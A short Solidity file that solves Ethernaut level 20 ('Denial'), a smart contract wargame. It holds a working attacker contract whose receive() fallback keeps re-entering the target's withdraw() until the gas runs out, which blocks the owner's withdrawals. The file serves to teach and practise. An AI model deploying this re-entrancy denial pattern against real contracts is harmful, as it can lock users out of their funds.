//SPDX-License-Identifier: MIT

//To deny the user withdrawal of funds we can implement a simple re-entrancy attack using withdraw
//because it lacks checks/security measures against the same.

pragma solidity ^0.6.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;

    function contractBalance() external view returns (uint256);
}

contract EthernautLevel20 {
    address denialContractAddress = 0x6352Cc0C9a18Ac5322A915599426BdaE20b769bb;

    function withdraw() public {
        IDenial(denialContractAddress).withdraw();
    }

    receive() external payable {
        //When an external contract or in this case the denial contract transfers funds
        //it will kickstart the re-entrancy attack from this fallback function and end in a recursive loop
        //until 63/64 of the total gas is used up hence denying the owner's transaction unless gas sent with original transaction
        //is of a very high magnitude.
        withdraw();
    }
}
